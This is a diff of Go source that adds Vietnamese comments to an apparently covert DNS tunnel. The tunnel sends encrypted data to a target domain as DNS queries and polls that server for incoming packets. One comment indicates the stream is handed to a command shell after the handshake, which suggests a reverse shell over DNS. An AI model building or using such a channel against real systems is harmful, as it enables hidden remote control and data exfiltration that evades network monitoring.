@@ -7,47 +7,55 @@ import (
 	"io"
 )
 
+// khởi tạo dnsStream chứa dữ liệu tên miền encrypt Key và id của client
 type dnsStream struct {
 	targetDomain  string
 	encryptionKey string
 	clientGuid    []byte
 }
 
+
+// khởi tạo chức năng với tên DNSStream với giá trị đầu vào là tên miền & encrypt Key với giá trị là string
 func DNSStream(targetDomain string, encryptionKey string) *dnsStream {
-	// Generate a "unique" client id.
+
+	// khởi tạo một id toàn cầu global user id
 	guid := xid.New()
 
-	// Specify the stream configuration.
+	// khởi tạo cấu hình chứa dữ liệu lần lượt là tên miền encrypt key và id client
 	dnsConfig := dnsStream{targetDomain: targetDomain, encryptionKey: encryptionKey, clientGuid: guid.Bytes()}
 
-	// Poll data from the DNS server.
+	// gọi chức năng pollRead và thăm dò phía máy chủ 
 	go pollRead(dnsConfig)
 
+	// khi đã bắt tay thành công thì trả về cho cmd thực thi
 	return &dnsConfig
 }
 
 func (stream *dnsStream) Read(data []byte) (int, error) {
-	// Wait for a packet in the queue.
+	// khởi tạo packet bằng giá trị của bộ đệm packetQueue
 	packet := <-packetQueue
-	// Copy it into the data buffer.
+	// Sao chép nó vào bộ đệm dữ liệu.
 	copy(data, packet)
-	// Return the number of bytes we read.
+	// trả về tổng số byte đã sao chép
 	return len(packet), nil
 }
 
 func (stream *dnsStream) Write(data []byte) (int, error) {
 
-	// Encode the packets.
+	// khởi tạo initPacket mã hóa các gói dỡ liệu
 	initPacket, dataPackets := Encode(data, true, stream.encryptionKey, stream.targetDomain, stream.clientGuid)
 
-	// Send the init packet to inform that we will send data.
+	// Gửi gói init để thông báo rằng chúng tôi sẽ gửi dữ liệu.
 	_, err := sendDNSQuery([]byte(initPacket), stream.targetDomain)
+
+	// nếu thấy có lỗi sẽ hiển thị ra 
 	if err != nil {
 		logging.Printf("Unable to send init packet : %v\n", err)
 		return 0, io.ErrClosedPipe
 	}
 
-	// Create a worker pool to asynchronously send DNS packets.
+	// Tạo một nhóm gồm 8 công nhân để gửi các gói DNS không đồng bộ.
+	// bạn có thể thay đổi theo sở thích
 	poll := tunny.NewFunc(8, func(packet interface{}) interface{} {
 		_, err := sendDNSQuery([]byte(packet.(string)), stream.targetDomain)
 
@@ -59,10 +67,11 @@ func (stream *dnsStream) Write(data []byte) (int, error) {
 	})
 	defer poll.Close()
 
-	// Send jobs to the pool.
+	// Gửi tất cả công việc đến hồ bơi.
 	for _, packet := range dataPackets {
 		poll.Process(packet)
 	}
 
+	// đếm và trả về tổng số lượng byte data
 	return len(data), nil
 }
